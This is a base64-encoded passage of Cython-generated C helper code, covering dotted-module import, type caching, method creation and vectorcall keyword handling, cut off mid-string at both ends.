U1FX1NBRkVfU0laRVxuICAgIG5wYXJ0cyA9IFB5VHVwbGVfR0VUX1NJWkUocGFydHNfdHVwbGUpO1xuI2Vsc2VcbiAgICBucGFydHMgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpO1xuICAgIGlmIChucGFydHMgPCAwKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgIGZvciAoaT0xOyBpIDwgbnBhcnRzICYmIG1vZHVsZTsgaSsrKSB7XG4gICAgICAgIFB5T2JqZWN0ICpwYXJ0LCAqc3VibW9kdWxlO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIHBhcnQgPSBQeVR1cGxlX0dFVF9JVEVNKHBhcnRzX3R1cGxlLCBpKTtcbiNlbHNlXG4gICAgICAgIHBhcnQgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0ocGFydHNfdHVwbGUsIGkpO1xuICAgICAgICBpZiAoIXBhcnQpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgICAgIHN1Ym1vZHVsZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG1vZHVsZSwgcGFydCk7XG4jaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUylcbiAgICAgICAgUHlfREVDUkVGKHBhcnQpO1xuI2VuZGlmXG4gICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpO1xuICAgICAgICBtb2R1bGUgPSBzdWJtb2R1bGU7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghbW9kdWxlKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9FcnJvcihuYW1lLCBwYXJ0c190dXBsZSwgaSk7XG4gICAgfVxuICAgIHJldHVybiBtb2R1bGU7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGUoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSkge1xuICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IF9fUHl4X0ltcG9ydChuYW1lLCBOVUxMLCAwKTtcbiAgICBpZiAoIXBhcnRzX3R1cGxlIHx8IHVubGlrZWx5KCFtb2R1bGUpKVxuICAgICAgICByZXR1cm4gbW9kdWxlO1xuICAgIGltcG9ydGVkX21vZHVsZSA9IF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKG5hbWUpO1xuICAgIGlmIChsaWtlbHkoaW1wb3J0ZWRfbW9kdWxlKSkge1xuICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTtcbiAgICAgICAgcmV0dXJuIGltcG9ydGVkX21vZHVsZTtcbiAgICB9XG4gICAgUHlFcnJfQ2xlYXIoKTtcbiAgICByZXR1cm4gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlX1dhbGtQYXJ0cyhtb2R1bGUsIG5hbWUsIHBhcnRzX3R1cGxlKTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICBQeU9iamVjdCAqbW9kdWxlID0gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9Mb29rdXAobmFtZSk7XG4gICAgaWYgKGxpa2VseShtb2R1bGUpKSB7XG4gICAgICAgIFB5T2JqZWN0ICpzcGVjID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IobW9kdWxlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BlYyk7XG4gICAgICAgIGlmIChsaWtlbHkoc3BlYykpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICp1bnNhZmUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihzcGVjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5pdGlhbGl6aW5nKTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkoIXVuc2FmZSB8fCAhX19QeXhfUHlPYmplY3RfSXNUcnVlKHVuc2FmZSkpKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHNwZWMpO1xuICAgICAgICAgICAgICAgIHNwZWMgPSBOVUxMO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgUHlfWERFQ1JFRih1bnNhZmUpO1xuICAgICAgICB9XG4gICAgICAgIGlmIChsaWtlbHkoIXNwZWMpKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICAgICAgcmV0dXJuIG1vZHVsZTtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoc3BlYyk7XG4gICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpO1xuICAgIH0gZWxzZSBpZiAoUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHVybiBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlKG5hbWUsIHBhcnRzX3R1cGxlKTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKSB7XG4gICAgdmFfbGlzdCB2YTtcbiAgICBQeU9iamVjdCAqbCA9IFB5TGlzdF9OZXcobik7XG4gICAgdmFfc3RhcnQodmEsIG4pO1xuICAgIGlmICh1bmxpa2VseSghbCkpIGdvdG8gZW5kO1xuICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGk8bjsgKytpKSB7XG4gICAgICAgIFB5T2JqZWN0ICphcmcgPSB2YV9hcmcodmEsIFB5T2JqZWN0Kik7XG4gICAgICAgIFB5X0lOQ1JFRihhcmcpO1xuICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKGwsIGksIGFyZykgIT0gKDApKSB7XG4gICAgICAgICAgICBQeV9DTEVBUihsKTtcbiAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICB9XG4gICAgfVxuICAgIGVuZDpcbiAgICB2YV9lbmQodmEpO1xuICAgIHJldHVybiBsO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfSW1wb3J0RnJvbShQeU9iamVjdCogbW9kdWxlLCBQeU9iamVjdCogbmFtZSkge1xuICAgIFB5T2JqZWN0KiB2YWx1ZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobW9kdWxlLCBuYW1lKTtcbiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSAmJiBQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkge1xuICAgICAgICBjb25zdCBjaGFyKiBtb2R1bGVfbmFtZV9zdHIgPSAwO1xuICAgICAgICBQeU9iamVjdCogbW9kdWxlX25hbWUgPSAwO1xuICAgICAgICBQeU9iamVjdCogbW9kdWxlX2RvdCA9IDA7XG4gICAgICAgIFB5T2JqZWN0KiBmdWxsX25hbWUgPSAwO1xuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICBtb2R1bGVfbmFtZV9zdHIgPSBQeU1vZHVsZV9HZXROYW1lKG1vZHVsZSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlX25hbWVfc3RyKSkgeyBnb3RvIG1vZGJhZDsgfVxuICAgICAgICBtb2R1bGVfbmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKG1vZHVsZV9uYW1lX3N0cik7XG4gICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlX25hbWUpKSB7IGdvdG8gbW9kYmFkOyB9XG4gICAgICAgIG1vZHVsZV9kb3QgPSBQeVVuaWNvZGVfQ29uY2F0KG1vZHVsZV9uYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yMyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlX2RvdCkpIHsgZ290byBtb2RiYWQ7IH1cbiAgICAgICAgZnVsbF9uYW1lID0gUHlVbmljb2RlX0NvbmNhdChtb2R1bGVfZG90LCBuYW1lKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFmdWxsX25hbWUpKSB7IGdvdG8gbW9kYmFkOyB9XG4gICAgICAgICNpZiAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZUFlfVkVSU0lPTl9OVU0gIDwgMHgwNzAzMDQwMCkgfHxcXFxuICAgICAgICAgICAgICAgIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUxcbiAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZXMpKVxuICAgICAgICAgICAgICAgIGdvdG8gbW9kYmFkO1xuICAgICAgICAgICAgdmFsdWUgPSBQeU9iamVjdF9HZXRJdGVtKG1vZHVsZXMsIGZ1bGxfbmFtZSk7XG4gICAgICAgIH1cbiAgICAgICAgI2Vsc2VcbiAgICAgICAgdmFsdWUgPSBQeUltcG9ydF9HZXRNb2R1bGUoZnVsbF9uYW1lKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICBtb2RiYWQ6XG4gICAgICAgIFB5X1hERUNSRUYoZnVsbF9uYW1lKTtcbiAgICAgICAgUHlfWERFQ1JFRihtb2R1bGVfZG90KTtcbiAgICAgICAgUHlfWERFQ1JFRihtb2R1bGVfbmFtZSk7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSB7XG4gICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19JbXBvcnRFcnJvciwgImNhbm5vdCBpbXBvcnQgbmFtZSAlUyIsIG5hbWUpO1xuICAgIH1cbiAgICByZXR1cm4gdmFsdWU7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSh2b2lkKSB7XG4gICAgcmV0dXJuIF9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZihfX1BZWF9BQklfTU9EVUxFX05BTUUpO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChQeU9iamVjdCAqZCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKmRlZmF1bHRfdmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX3NhZmVfdHlwZSkge1xuICAgIFB5T2JqZWN0KiB2YWx1ZTtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpc19zYWZlX3R5cGUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB2YWx1ZSA9IFB5T2JqZWN0X0NhbGxNZXRob2QoZCwgInNldGRlZmF1bHQiLCAiT08iLCBrZXksIGRlZmF1bHRfdmFsdWUpO1xuI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgIFB5RGljdF9TZXREZWZhdWx0UmVmKGQsIGtleSwgZGVmYXVsdF92YWx1ZSwgJnZhbHVlKTtcbiNlbHNlXG4gICAgdmFsdWUgPSBQeURpY3RfU2V0RGVmYXVsdChkLCBrZXksIGRlZmF1bHRfdmFsdWUpO1xuICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSByZXR1cm4gTlVMTDtcbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuI2VuZGlmXG4gICAgcmV0dXJuIHZhbHVlO1xufVxuXG5cbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMFxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobW9kdWxlLCBzcGVjLCBiYXNlcyk7XG4gICAgaWYgKHJlc3VsdCAmJiBtZXRhY2xhc3MpIHtcbiAgICAgICAgUHlPYmplY3QgKm9sZF90cCA9IChQeU9iamVjdCopUHlfVFlQRShyZXN1bHQpO1xuICAgIFB5X0lOQ1JFRigoUHlPYmplY3QqKW1ldGFjbGFzcyk7XG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4gICAgICAgIFB5X1NFVF9UWVBFKHJlc3VsdCwgbWV0YWNsYXNzKTtcbiNlbHNlXG4gICAgICAgIHJlc3VsdC0+b2JfdHlwZSA9IG1ldGFjbGFzcztcbiNlbmRpZlxuICAgICAgICBQeV9ERUNSRUYob2xkX3RwKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTWV0YWNsYXNzKG1lLCBtbywgcywgYikgUHlUeXBlX0Zyb21NZXRhY2xhc3MobWUsIG1vLCBzLCBiKVxuI2VuZGlmXG5zdGF0aWMgaW50IF9fUHl4X1ZlcmlmeUNhY2hlZFR5cGUoUHlPYmplY3QgKmNhY2hlZF90eXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNoYXIgKm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCBleHBlY3RlZF9iYXNpY3NpemUpIHtcbiAgICBQeV9zc2l6ZV90IGJhc2ljc2l6ZTtcbiAgICBpZiAoIVB5VHlwZV9DaGVjayhjYWNoZWRfdHlwZSkpIHtcbiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICJTaGFyZWQgQ3l0aG9uIHR5cGUgJS4yMDBzIGlzIG5vdCBhIHR5cGUgb2JqZWN0IiwgbmFtZSk7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgaWYgKGV4cGVjdGVkX2Jhc2ljc2l6ZSA9PSAwKSB7XG4gICAgICAgIHJldHVybiAwOyAvLyBzaXplIGlzIGluaGVyaXRlZCwgbm90aGluZyB1c2VmdWwgdG8gY2hlY2tcbiAgICB9XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0ICpweV9iYXNpY3NpemU7XG4gICAgcHlfYmFzaWNzaXplID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjYWNoZWRfdHlwZSwgIl9fYmFzaWNzaXplX18iKTtcbiAgICBpZiAodW5saWtlbHkoIXB5X2Jhc2ljc2l6ZSkpIHJldHVybiAtMTtcbiAgICBiYXNpY3NpemUgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2Jhc2ljc2l6ZSk7XG4gICAgUHlfREVDUkVGKHB5X2Jhc2ljc2l6ZSk7XG4gICAgcHlfYmFzaWNzaXplID0gTlVMTDtcbiAgICBpZiAodW5saWtlbHkoYmFzaWNzaXplID09IChQeV9zc2l6ZV90KS0xKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gLTE7XG4jZWxzZVxuICAgIGJhc2ljc2l6ZSA9ICgoUHlUeXBlT2JqZWN0KikgY2FjaGVkX3R5cGUpLT50cF9iYXNpY3NpemU7XG4jZW5kaWZcbiAgICBpZiAoYmFzaWNzaXplICE9IGV4cGVjdGVkX2Jhc2ljc2l6ZSkge1xuICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgIlNoYXJlZCBDeXRob24gdHlwZSAlLjIwMHMgaGFzIHRoZSB3cm9uZyBzaXplLCB0cnkgcmVjb21waWxpbmciLFxuICAgICAgICAgICAgbmFtZSk7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlUeXBlT2JqZWN0ICpfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykge1xuICAgIFB5T2JqZWN0ICphYmlfbW9kdWxlID0gTlVMTCwgKmNhY2hlZF90eXBlID0gTlVMTCwgKmFiaV9tb2R1bGVfZGljdCwgKm5ld19jYWNoZWRfdHlwZSwgKnB5X29iamVjdF9uYW1lO1xuICAgIGludCBnZXRfaXRlbV9yZWZfcmVzdWx0O1xuICAgIGNvbnN0IGNoYXIqIG9iamVjdF9uYW1lID0gc3RycmNocihzcGVjLT5uYW1lLCBcJy5cJyk7XG4gICAgb2JqZWN0X25hbWUgPSBvYmplY3RfbmFtZSA/IG9iamVjdF9uYW1lKzEgOiBzcGVjLT5uYW1lO1xuICAgIHB5X29iamVjdF9uYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcob2JqZWN0X25hbWUpO1xuICAgIGlmICghcHlfb2JqZWN0X25hbWUpIHJldHVybiBOVUxMO1xuICAgIGFiaV9tb2R1bGUgPSBfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSgpO1xuICAgIGlmICghYWJpX21vZHVsZSkgZ290byBkb25lO1xuICAgIGFiaV9tb2R1bGVfZGljdCA9IFB5TW9kdWxlX0dldERpY3QoYWJpX21vZHVsZSk7XG4gICAgaWYgKCFhYmlfbW9kdWxlX2RpY3QpIGdvdG8gZG9uZTtcbiAgICBnZXRfaXRlbV9yZWZfcmVzdWx0ID0gX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoYWJpX21vZHVsZV9kaWN0LCBweV9vYmplY3RfbmFtZSwgJmNhY2hlZF90eXBlKTtcbiAgICBpZiAoZ2V0X2l0ZW1fcmVmX3Jlc3VsdCA9PSAxKSB7XG4gICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKFxuICAgICAgICAgICAgICBjYWNoZWRfdHlwZSxcbiAgICAgICAgICAgICAgb2JqZWN0X25hbWUsXG4gICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShnZXRfaXRlbV9yZWZfcmVzdWx0ID09IC0xKSkge1xuICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIobW9kdWxlKTtcbiAgICBjYWNoZWRfdHlwZSA9IF9fUHl4X1B5VHlwZV9Gcm9tTWV0YWNsYXNzKG1ldGFjbGFzcywgYWJpX21vZHVsZSwgc3BlYywgYmFzZXMpO1xuICAgIGlmICh1bmxpa2VseSghY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhzcGVjLCAoUHlUeXBlT2JqZWN0ICopIGNhY2hlZF90eXBlKSA8IDApKSBnb3RvIGJhZDtcbiAgICBuZXdfY2FjaGVkX3R5cGUgPSBfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChhYmlfbW9kdWxlX2RpY3QsIHB5X29iamVjdF9uYW1lLCBjYWNoZWRfdHlwZSwgMSk7XG4gICAgaWYgKHVubGlrZWx5KG5ld19jYWNoZWRfdHlwZSAhPSBjYWNoZWRfdHlwZSkpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdfY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDtcbiAgICAgICAgUHlfREVDUkVGKGNhY2hlZF90eXBlKTtcbiAgICAgICAgY2FjaGVkX3R5cGUgPSBuZXdfY2FjaGVkX3R5cGU7XG4gICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKFxuICAgICAgICAgICAgICAgIGNhY2hlZF90eXBlLFxuICAgICAgICAgICAgICAgIG9iamVjdF9uYW1lLFxuICAgICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlfREVDUkVGKG5ld19jYWNoZWRfdHlwZSk7XG4gICAgfVxuZG9uZTpcbiAgICBQeV9YREVDUkVGKGFiaV9tb2R1bGUpO1xuICAgIFB5X0RFQ1JFRihweV9vYmplY3RfbmFtZSk7XG4gICAgYXNzZXJ0KGNhY2hlZF90eXBlID09IE5VTEwgfHwgUHlUeXBlX0NoZWNrKGNhY2hlZF90eXBlKSk7XG4gICAgcmV0dXJuIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGU7XG5iYWQ6XG4gICAgUHlfWERFQ1JFRihjYWNoZWRfdHlwZSk7XG4gICAgY2FjaGVkX3R5cGUgPSBOVUxMO1xuICAgIGdvdG8gZG9uZTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldF9tb2R1bGUoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqc2VsZiwgQ1lUSE9OX1VOVVNFRCB2b2lkKiBjb250ZXh0KSB7XG4gICAgcmV0dXJuIFB5VW5pY29kZV9Gcm9tU3RyaW5nKF9fUFlYX0FCSV9NT0RVTEVfTkFNRSk7XG59XG5zdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0c2V0W10gPSB7XG4gICAgeyJfX21vZHVsZV9fIiwgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZSwgTlVMTCwgTlVMTCwgTlVMTH0sXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3Nsb3RzW10gPSB7XG4gICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXR9LFxuICAgIHswLCAwfVxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zcGVjID0ge1xuICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiX2NvbW1vbl90eXBlc19tZXRhdHlwZSIsXG4gICAgMCxcbiAgICAwLFxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEUgfFxuICAgIFB5X1RQRkxBR1NfRElTQUxMT1dfSU5TVEFOVElBVElPTiB8XG4jZW5kaWZcbiAgICBQeV9UUEZMQUdTX0RFRkFVTFQsXG4gICAgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc2xvdHNcbn07XG5zdGF0aWMgaW50IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2luaXQoUHlPYmplY3QgKm1vZHVsZSkge1xuICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7XG4gICAgUHlPYmplY3QgKmJhc2VzID0gUHlUdXBsZV9QYWNrKDEsICZQeVR5cGVfVHlwZSk7XG4gICAgaWYgKHVubGlrZWx5KCFiYXNlcykpIHtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSA9IF9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKE5VTEwsIG1vZHVsZSwgJl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3NwZWMsIGJhc2VzKTtcbiAgICBQeV9ERUNSRUYoYmFzZXMpO1xuICAgIGlmICh1bmxpa2VseShtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSA9PSBOVUxMKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7XG4gICAgaWYgKCFzZWxmKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZ1bmMpO1xuICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICphcmdzW10gPSB7ZnVuYywgc2VsZn07XG4gICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X1ZlY3RvcmNhbGwoX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSwgYXJncywgMiwgTlVMTCk7XG4gICAgfVxuICAgICNlbHNlXG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlLCBmdW5jLCBzZWxmLCBOVUxMKTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2Vsc2VcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7XG4gICAgaWYgKCFzZWxmKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZ1bmMpO1xuICAgIHJldHVybiBQeU1ldGhvZF9OZXcoZnVuYywgc2VsZik7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0X2t3KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdylcbntcbiAgICBQeU9iamVjdCAqcmVzID0gTlVMTDtcbiAgICBQeU9iamVjdCAqa3duYW1lcztcbiAgICBQeU9iamVjdCAqKm5ld2FyZ3M7XG4gICAgUHlPYmplY3QgKiprd3ZhbHVlcztcbiAgICBQeV9zc2l6ZV90IGksIHBvcztcbiAgICBzaXplX3QgajtcbiAgICBQeU9iamVjdCAqa2V5LCAqdmFsdWU7XG4gICAgdW5zaWduZWQgbG9uZyBrZXlzX2FyZV9zdHJpbmdzO1xuICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBQeV9zc2l6ZV90IG5rdyA9IFB5RGljdF9TaXplKGt3KTtcbiAgICBpZiAodW5saWtlbHkobmt3ID09IC0xKSkgcmV0dXJuIE5VTEw7XG4gICAgI2Vsc2VcbiAgICBQeV9zc2l6ZV90IG5rdyA9IFB5RGljdF9HRVRfU0laRShrdyk7XG4gICAgI2VuZGlmXG4gICAgbmV3YXJncyA9IChQeU9iamVjdCAqKilQeU1lbV9NYWxsb2MoKG5hcmdzICsgKHNpemVfdClua3cpICogc2l6ZW9mKGFyZ3NbMF0pKTtcbiAgICBpZiAodW5saWtlbHkobmV3YXJncyA9PSBOVUxMKSkge1xuICAgICAgICBQeUVycl9Ob01lbW9yeSgpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgZm9yIChqID0gMDsgaiA8IG5hcmdzOyBqKyspIG5ld2FyZ3Nbal0gPSBhcmdzW2pdO1xuICAgIGt3bmFtZXMgPSBQeVR1cGxlX05ldyhua3cpO1xuICAgIGlmICh1bmxpa2VseShrd25hbWVzID09IE5VTEwpKSB7XG4gICAgICAgIFB5TWVtX0ZyZWUobmV3YXJncyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBrd3ZhbH